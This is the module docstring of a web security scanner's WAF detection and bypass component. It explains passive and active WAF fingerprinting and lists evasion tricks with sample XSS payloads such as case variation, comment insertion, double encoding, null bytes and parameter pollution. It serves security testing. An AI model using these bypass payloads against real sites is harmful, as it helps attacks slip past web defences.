"""
scanner/web/waf.py
==================
Smart WAF Detection & Bypass Engine.

What is a WAF?
--------------
A Web Application Firewall (WAF) inspects HTTP requests and blocks those
matching known attack signatures. Common WAFs: Cloudflare, ModSecurity,
AWS WAF, Imperva, Akamai, Sucuri, Barracuda, F5 BIG-IP, Fortinet.

Detection Approach
------------------
1. Passive Detection — Analyse response headers, cookies, and status codes
   from a normal request for WAF-specific fingerprints.
2. Active Probe    — Send a known malicious payload (e.g. <script>alert(1)</script>)
   and check whether the response changes (block page, 403, redirect).
3. Fingerprinting  — Match the block response against WAF-specific signatures
   to identify exactly which WAF is running.

Bypass Techniques
-----------------
Once a WAF is detected, AlanScan switches to evasion payloads:
- Case variation:       <ScRiPt>
- Comment insertion:    <scr/**/ipt>
- URL double-encoding:  %253Cscript%253E
- Null byte insertion:  <scr\x00ipt>
- Unicode escapes:      \u003cscript\u003e
- HTML entity encoding: &#60;script&#62;
- Whitespace variants:  <script  >alert(1)</script  >
- Chunked encoding:     Transfer-Encoding bypass
- HTTP parameter pollution: param=clean&param=payload

OWASP Reference: WSTG-INPV-01, CWE-693
"""

